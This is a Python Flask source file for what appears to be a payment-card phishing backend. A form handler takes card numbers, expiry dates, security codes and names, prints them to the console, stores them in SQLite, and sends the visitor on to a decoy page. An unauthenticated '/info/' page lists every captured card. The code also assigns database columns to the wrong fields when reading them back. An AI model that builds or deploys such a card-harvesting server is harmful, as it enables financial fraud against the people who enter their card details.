from flask import Flask
import random
from flask import render_template, request, redirect
import sqlite3

app = Flask(  # Create a flask app
  __name__,
  template_folder='templates',  # Name of html file folder
  static_folder='static'  # Name of directory for static files
)

connection = sqlite3.connect('MyDB.db', check_same_thread=False)
cursor = connection.cursor()
print("Connected to the database...")
sql_command = """
  CREATE TABLE IF NOT EXISTS inputs (
  input_id INTEGER PRIMARY KEY,
  name TEXT NOT NULL,
	cc TEXT NOT NULL,
  exp TEXT NOT NULL,
  sn TEXT NOT NULL);
"""
cursor.execute(sql_command)
connection.commit()


@app.route('/')
def base_page():
  print("a user connected...")
  return render_template('index.html')

@app.route('/notanswer/')
def answers():
  return render_template('answers.html')

@app.route('/info/')
def showinfo():
  cursor.execute('''SELECT * from inputs''')
  row = cursor.fetchone()
  ccarr = []
  expdarr = []
  namearr = []
  snarr = []
  while row is not None:
    cc = row[1]
    expd = row[2]
    name = row[3]
    sn = row[4]
    ccarr.append(cc)
    expdarr.append(expd)
    namearr.append(name)
    snarr.append(sn)
    row = cursor.fetchone()
  num = len(namearr)
  return render_template('info.html', name=namearr, cc=ccarr, expd=expdarr, sn=snarr,  num = num)

@app.route("/submit/", methods=['POST'])
def submit():
  if request.method == "POST":
    cc = request.form.get("cc")
    exp = request.form.get("expd")
    sn = request.form.get("sn")
    name = request.form.get("name")
    name = name.replace(" ", "_")
    print(cc)
    print(exp)
    print(sn)
    print(name)
    cursor.execute("INSERT INTO inputs (name, cc, exp, sn) VALUES (?,?,?,?)",(name, cc, exp, sn))
    connection.commit()
    return redirect('/notanswer/')
  return redirect('/')


if __name__ == "__main__":  # Makes sure this is the main process
  app.run(  # Starts the site
    host='0.0.0.0',  # EStablishes the host, required for repl to detect the site
    port=random.randint(2000, 9000))
